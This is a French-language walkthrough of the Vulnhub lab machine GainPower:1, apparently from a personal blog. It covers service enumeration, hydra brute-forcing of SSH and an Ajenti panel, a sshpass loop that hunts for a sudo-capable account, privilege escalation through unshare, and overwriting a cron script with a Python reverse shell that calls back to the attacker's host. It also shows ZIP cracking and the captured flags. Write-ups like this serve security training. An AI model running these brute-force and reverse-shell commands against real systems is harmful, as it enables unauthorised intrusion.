---
layout: default
title: "Writeup GainPower: 1 - Vulnhub"
date:   2020-07-07 10:00:00 +0200
published: true
---

# Information sur la box :

* **Difficulté** : Débutant / Intermédiaire
* **Description** : *Warning: Be careful with "rabbit hole" !*
* **Type de fichier** : .ova (VirtualBox)
* **DHCP** : Activé
* **Lien** : [https://www.vulnhub.com/entry/gainpower-1,493/](https://www.vulnhub.com/entry/gainpower-1,493/)


### Ce que nous allons aborder dans ce writeup :

*	[Énumération](#énumération)
* 	[Shell basique](#shell-basique)
*	[Privilege escalation](#privilege-escalation)
*   [Root](#root)

* * *

## Énumération
* * *

Comme le DHCP est activé il faut qu'on connaisse l'adresse IP de la box. Pour se faire on utilise ``nmap`` avec l'option ``-sP`` (**Ping Scan**) :

```bash
nmap -sP 192.168.1.0/24
```

Et on obtient l'IP : **192.168.1.21**

On enchaîne donc avec l'énumération des services de la box : 

```bash
nmap -sV -p- 192.168.1.21 -O -A --min-rate 5000 -T5
```

* **-sV** : Permet de scanner les services et d'indiquer les versions et les informations correspondantes
* **-p-** : On scan TOUS les ports
* **-O** : Détection de l'OS
* **-A** : Mode aggressif
* **--min-rate 5000** : Définit le nombre d'envoi de paquets par secondes
* **-T5** : Définit le template comme "rapide"

Pour plus d'informations vous pouvez consulter le ``man`` de nmap.

On récupère donc ceci : 

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 88:41:61:11:e1:1f:18:7d:d6:0c:38:29:25:79:16:2c (RSA)
|   256 18:c5:fd:ce:cd:2b:92:f8:d9:17:17:21:24:9d:67:df (ECDSA)
|_  256 84:c5:14:e4:e9:33:21:41:6a:92:72:b9:a7:33:1a:ea (EdDSA)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS)
|_http-title: Watch shop | eCommers
8000/tcp open  http    Ajenti http control panel
|_http-title: Ajenti
``` 

Mon premier réflexe a été de me rendre sur le **site Web** sur le port **80** :

En parallèle j'ai lancé **ffuf** pour faire du fuzzing de directory :

```bash
ffuf -u http://192.168.1.21:80/FUZZ -w /usr/share/dirb/wordlists/directory-list-2.3-big.txt -e .php,.txt,.html
```

Le site situé sur le port 80 est un site vitrine de vente. Après avoir regardé le code source et parcouru l'ensemble des pages du site rien n'a été trouvé.                                         
Comme la description le souligne je suis tombé sur plusieurs "rabbit holes".

Notamment un compte [Facebook](https://www.facebook.com/sai4ull) sur lequel on trouve dans la catégorie "Télévision" : [https://www.facebook.com/rabbitholebd/](https://www.facebook.com/rabbitholebd/).

D'un autre côté ffuf n'a rien trouvé de bien intéressant. Il y a beaucoup de fichiers commençant par "b" qui ont été trouvés mais on peut aussi en conclure qu'il s'agit également d'une fausse piste.

Un répertoire a cependant retenu mon attention : [http://192.168.1.21/secret/](http://192.168.1.21/secret/). A l'intérieur on trouve plusieurs images avec des trolls. Donc sûrement encore un cul-de-sac.
Mais pour être sûr de cette info j'ai téléchargé les fichiers pour tenter d'en extraire les potentielles informations. 

Un mot de passe *vide* ne fonctionne pour aucune image. J'ai alors tenté de cracker la passphrase avec **stegcracker** mais aucun résultat.

Le fichier [http://192.168.1.21/test.php](http://192.168.1.21/test.php) a également été trouvé par ffuf grâce à l'option ``-e`` qui permet de spécifier des extensions.

Son contenu est le suivant : 

```
<?php phpinfo(); ?>
//ToDO - Configure PHP...
```

On pourrait croire qu'il y a une faille PHP quelque part sur le site mais finalement aucun exploit possible.

Il existe une page de login sur le site vitrine sous [http://192.168.1.21/login.html](http://192.168.1.21/login.html). On pourrait donc croire qu'il y a une possibilité d'exploit sur le formulaire mais un *submit* n'envoie aucune donnée et appelle la même page ([http://192.168.1.21/login.html#](http://192.168.1.21/login.html#))

Après avoir exploré de fond en comble tout le site web sur le port 80, j'ai bougé sur celui port **8000**.                                                               
On atterit sur une page de login d'Ajenti : [192.168.1.21:8000](192.168.1.21:8000)

Ajenti permet d'administrer un serveur.

J'ai donc commencé par chercher de la documentation sur Internet pour trouver les **default credentials**. Je suis donc tombé sur cette [page](http://docs.ajenti.org/en/latest/man/run.html).             
Le login par défaut est ``root`` et le mot de passe est celui du système.

J'ai tenté de **bruteforce** la page de login en espérant que le mot de passe soit facile à deviner (*et dans une wordlist*) :

```bash
hydra -l root -P /usr/share/wordlist/rockyou.txt 192.168.1.21 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid" -V -s 8000
```

Malheureusement aucun résultat. Le code source ne donne rien et on n'a plus aucune nouvelle information exploitable.

Après avoir beaucoup tourné en rond, revenu sur la site vitrine pour faire plus de recherches, toujours rien de nouveau.

Comme mon gros point faible est l'énumération j'ai cherché très longtemps avant de me rendre compte qu'il me restait un port que je n'avais pas encore exploré.

J'ai donc tenté de me connecter avec un compte aléatoire via SSH et la bannière de connexion nous donne ces informations : 

```
Hi !!! THIS MESSAGE IS ONLY VISIBLE IN OUR NETWORK :) 

   ___      _        ___                    
  / __|__ _(_)_ _   | _ \_____ __ _____ _ _ 
 | (_ / _` | | ' \  |  _/ _ \ V  V / -_) '_|
  \___\__,_|_|_||_| |_| \___/\_/\_/\___|_|  
                                            

I HOPE EVERYONE KNOW THE JOINING ID CAUSE THAT IS YOUR USERNAME : ie : employee1 employee2 ... ... ... so on ;)

I already told the format of password of everyone in the yesterday's metting.

Now i have configured everything. My request is to everyone to Complete assignments on time 

btw one of my employee have sudo powers because he is my favourite 

NOTE : "This message will automatically removed after 2 days" 
								- BOSS
```

Deux informations très importantes apparaissent.                                                                                           
* La première est que le username est de la forme employee1 ou employee2 ou quelque chose dans ce style.
* La deuxième est que l'un des employés a les droits sudo.

* * *

## Shell basique

Je lance donc hydra pour tenter de bruteforce le mot de passe SSH : 

```bash
hydra -l employee1 -P /usr/share/wordlist/rockyou.txt 192.168.1.21 -t 4 ssh -s 22
```

A côté j'ai essayé des mots de passe potentiels à la main. Avec ~~beaucoup de~~ chance le premier que j'ai testé a fonctionné. Il s'agit de **employee1**.

Je me retrouve donc avec un shell basique sur la machine.

Dans le home directory il y a beaucoup de dossiers avec des sous-dossiers. Après avoir fait un ``ls -la -R .`` on se rend compte qu'il n'y a aucun fichier au fond de ceux-ci.

On peut s'apercevoir également qu'il y a beaucoup d'utilisateurs sur la machine en regardant le fichier ``/etc/passwd``.                                                        
En effet, on voit qu'il y a **100 utilisateurs** nommés employeeX avec X allant de 1 à 100.

Avec le message de la bannière qui dit qu'un utilisateur a les droits sudo, on devine rapidement qu'il faut trouver lequel des 100 utilisateurs possède ces droits.
Une possibilité est de tester tous les utilisateurs à la main mais ce serait trop long. 

J'ai essayé de me connecter à employee2 manuellement avec le même mot de passe que le username. On arrive à s'y connecter. Avec cette information on sait que tous les utilisateurs possèdent un mot de passe identique à leur nom d'utilisateur.

On peut donc écrire un petit script qui va se connecter au compte de l'utilisateur via SSH et exécuter la commande ``sudo -l`` pour voir s'il possède les droits suffisants :

```bash
#!/bin/bash

for i in {1..100}
do
	employee_number="employee$i"
	result=`sshpass -p $employee_number ssh -q -t $employee_number@192.168.1.21 "echo $employee_number | sudo -S -l"`
	#sshpass to give password through STDIN, -q for quiet, -t to execute commands with pseudo tty
	nb_words=`echo $result | wc -w`

	if (($nb_words > 10))
	then
		echo $employee_number
		exit
	fi

done
```

Pour tous les utilisateurs on va effectuer la même commande. On va prendre l'exemple pour **employee1** :

```bash
sshpass -p employee1 ssh -q -t employee1@192.168.1.21 "echo employee1 | sudo -S -l"
```

Lorsqu'on veut utiliser SSH il faut rentrer le mot de passe lorsqu'on nous le demande. Grâce à ``sshpass`` on peut passer un mot de passe en **STDIN** à SSH sans voir besoin de la spécifier ensuite quand on nous le demande.                                                
L'option ``-q`` de SSH est le mode quiet qui permet de ne pas afficher la bannière lors de la connexion SSH.                                                  
L'option ``-t`` permet d'utiliser un tty par défaut sinon on a une erreur lors de l'exécution de la commande à distance.

La partie exécution de commande fonctionne un peu de la même façon. On affiche le mot de passe que l'on passe en entrée de la commande ``sudo`` via le pipe (``|``) et l'option ``-S`` pour **STDIN**.

De ce fait on va lister les droits de l'utilisateur courant si celui-ci les possède.

On va ensuite compter le nombre de mots de la réponse pour savoir si l'utilisateur a les droits suffisants. En cas d'erreur le message sera le suivant :

```bash
Sorry, user employee1 may not run sudo on pc-298.
```

On peut voir que le message d'erreur fait au maximum 9 mots. On stocke le nombre de mots du message dans la variable ``nb_words``. On va ensuite regarder si le nombre est supérieur à 10 ou non. Si ce n'est pas le cas alors c'est un message d'erreur sinon c'est que le message est plus long et donc que l'utilisateur possède les droits sudo.

On lance le script et après quelques minutes on obtient **employee64**.

* * *

## Privilege escalation

On se connecte donc manuellement à employee64 avec le mot de passe employee64, on fait un ``sudo -l`` et on obtient :

```bash
Matching Defaults entries for employee64 on pc-298:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG
    LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS
    _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User employee64 may run the following commands on pc-298:
    (programmer) /usr/bin/unshare
```

Ce qui nous intéresse ici sont les deux dernières lignes. Avec ces infos on sait qu'on peut exécuter la commande ``/usr/bin/unshare`` en tant que l'utilisateur **programmer**.

Après avoir fait un tour sur [GTFOBins](https://gtfobins.github.io/gtfobins/unshare/#sudo) on voit qu'un peut obtenir un shell via cette commande. Dans notre cas on peut l'exécuter en tant que **programmer** donc :

```bash
sudo -u programmer /usr/bin/unshare /bin/bash
```

Nous sommes donc maintenant **programmer**

```bash
id
uid=1182(programmer) gid=1184(prome) groups=1184(prome) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

J'ai également tenté de regarder s'il y avait un script ou un binaire avec les droits SUID avec cette commande :

```bash
find / -perm -4000 2>/dev/null
```

Mais aucun résultat positif.

J'ai également lancé [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) pour voir s'il y avait une possibilité d'escalation de privilèges. Et là quelque chose d'intéressant est apparu :

```
[+] Modified interesting files in the last 5mins (limit 100)
/var/log/cron
/var/log/maillog
/var/log/messages
/var/log/secure
/var/spool/mail/vanshal
/media/programmer/scripts/backup.sh
```

La dernière ligne parait suspecte. Cependant rien n'a été relevé au niveau des cron jobs.

On sait qu'il a été modifié au moins une fois dans les 5 dernières minutes selon **linPEAS**.                                                                     
Pour en savoir plus on peut utiliser **pspy64** qui permet de visualiser les processus du système en temps réel. Après l'avoir lancé et attendu quelques minutes on obtient cette ligne :

```bash
2020/07/06 17:21:01 CMD: UID=1183 PID=22096  | /bin/bash /media/programmer/scripts/backup.sh
```

On sait donc que ce script est lancé toutes les minutes par l'utilisateur ayant l'id **1183**. Pour savoir quel est l'utilisateur correspondant il nous suffit de le chercher dans le fichier ``/etc/passwd`` :

```bash
cat /etc/passwd | grep 1183
```

Il s'agit de **vanshal**

```bash
vanshal:x:1183:1184::/home/vanshal:/bin/bash
```

On peut donc en déduire que si on arrive à exploiter le script alors on aura un accès en tant que vanshal.

```bash
ls -la /media/programmer/scripts/backup.sh
-rwxr-xr-x. 1 programmer prome 20  7 juil. 14:53 /media/programmer/scripts/backup.sh
```

La modification nous est accessible, de ce fait on peut obtenir un reverse shell. Malheureusement **netcat** n'est pas présent, on va donc utiliser **python** :

```bash
echo "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.16',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"" > /media/programmer/scripts/backup.sh
```

Côté de notre machine on lance netcat en mode listener :

```bash
nc -lnvp 4444
```

Et après quelques instants on obtient un shell en tant que vanshal !

On peut récupérer le flag de l'utilisateur :

```
cat local.txt
		
		░██████╗░░█████╗░██╗███╗░░██╗  ██████╗░░█████╗░░██╗░░░░░░░██╗███████╗██████╗░
		██╔════╝░██╔══██╗██║████╗░██║  ██╔══██╗██╔══██╗░██║░░██╗░░██║██╔════╝██╔══██╗
		██║░░██╗░███████║██║██╔██╗██║  ██████╔╝██║░░██║░╚██╗████╗██╔╝█████╗░░██████╔╝
		██║░░╚██╗██╔══██║██║██║╚████║  ██╔═══╝░██║░░██║░░████╔═████║░██╔══╝░░██╔══██╗
		╚██████╔╝██║░░██║██║██║░╚███║  ██║░░░░░╚█████╔╝░░╚██╔╝░╚██╔╝░███████╗██║░░██║
		░╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝  ╚═╝░░░░░░╚════╝░░░░╚═╝░░░╚═╝░░╚══════╝╚═╝░░╚═╝


		   You successfully owned the user of this box :-) Best of Luck for the root 


flag: 5c2a29d7b95868da9e503502f301e8dd

Twitter : VanshalG
```

Un fichier **ZIP** est présent dans ``/home/vanshal``. On va le récupérer sur notre machine locale pour voir ce qu'on peut en faire.

En local après avoir tenté de le ``unzip`` on se rend compte qu'il est protégé par un mot de passe.                                               
On va donc essayer de le bruteforce avec **JohnTheRipper**.

J'ai fait un article [ici](https://kr0wz.github.io/fr/2020/06/28/john-the-ripper.html) à ce sujet si ça vous intéresse.

```bash
/opt/JohnTheRipper/run/zip2john secret.zip > zip.hash
/opt/JohnTheRipper/run/john --wordlist=/usr/share/wordlist/rockyou.txt zip.hash

81237900         (secret.zip/Mypasswords.txt)
```

On peut maintenant ``unzip`` le fichier et afficher le contenu de ``Mypasswords.txt``.

```
aTQ!vYxQUh3$&uaN3p%@_ax#Ab2XNZ!5$rFh$@bDMyxt#&Q2L&4+DvDT?A!MPKK9sFq-V8_d$5gQLKyKhf-4&S=_m^Cx?bZYf8Bv%%*H^GcvDc4ayfPk^HWs8bnD%Ayk3$5WP6_K?a6_%MF&e-DS2ZZ$m93BL3CY!huQDM2-JZcMSMKT8K*Z7zLPGATU7JP&x#JtaZHAbM^%$TK%C3ubXV4#e87M6P-puXTTMbzuP5y4qX6Uzd%ed8Ux_vMX=pCB
```

## Root

A ce moment j'ai encore tourné pendant un certain moment car je ne savais pas quoi faire de ce password.

Le seul endroit que je n'ai pas réussi à exploiter jusqu'à maintenant a été l'interface **Ajenti** sur le port **8000**.                                                     
J'ai donc tenté avec le login par défaut qui est ``root`` ainsi qu'avec le mot de passe qu'on vient de trouver et ... on arrive sur le **dashboard**.

Il ne nous reste plus qu'à nous rendre dans la liste de gauche sur **Terminal** et de lancer la commande ``/bin/bash`` pour obtenir un web shell en tant que root et donc récupérer le dernier flag :

```
cat proof.txt
                                                                                                                                                                

       ░██████╗░░█████╗░██╗███╗░░██╗  ██████╗░░█████╗░░██╗░░░░░░░██╗███████╗██████╗░                                                                            
       ██╔════╝░██╔══██╗██║████╗░██║  ██╔══██╗██╔══██╗░██║░░██╗░░██║██╔════╝██╔══██╗                                                                            
       ██║░░██╗░███████║██║██╔██╗██║  ██████╔╝██║░░██║░╚██╗████╗██╔╝█████╗░░██████╔╝                                                                            
       ██║░░╚██╗██╔══██║██║██║╚████║  ██╔═══╝░██║░░██║░░████╔═████║░██╔══╝░░██╔══██╗                                                                            
       ╚██████╔╝██║░░██║██║██║░╚███║  ██║░░░░░╚█████╔╝░░╚██╔╝░╚██╔╝░███████╗██║░░██║                                                                            
       ░╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝  ╚═╝░░░░░░╚════╝░░░░╚═╝░░░╚═╝░░╚══════╝╚═╝░░╚═╝                                                                            
_________                                     __        .__          __  .__                                                                                    
\_   ___ \  ____   ____    ________________ _/  |_ __ __|  | _____ _/  |_|__| ____   ____                                                                       
/    \  \/ /  _ \ /    \  / ___\_  __ \__  \\   __\  |  \  | \__  \\   __\  |/  _ \ /    \                                                                      
\     \___(  <_> )   |  \/ /_/  >  | \// __ \|  | |  |  /  |__/ __ \|  | |  (  <_> )   |  \                                                                     
 \______  /\____/|___|  /\___  /|__|  (____  /__| |____/|____(____  /__| |__|\____/|___|  /                                                                     
        \/            \//_____/            \/                     \/                    \/                                                                      
                                                                                                                                                                                                                                                                                                                        

You successfully owned the root of this box :-)                                                                                                                     

Flag: eb2e174c3883ff6b5fd871167795b4d6                                                                                                                          
                                                                                                                                                               
Twitter : VanshalG                                                                                                                                              
```

C'était une box super **intéressante** même si j'ai bien galéré à certains moments.                                                                    
J'ai trouvé l'idée très bonne de devoir revenir en arrière à la toute fin pour pouvoir avoir le root via l'interface web Ajenti au lieu de continuer directement grâce au shell obtenu précédemment.

Merci à **@VanshalG** pour cette box !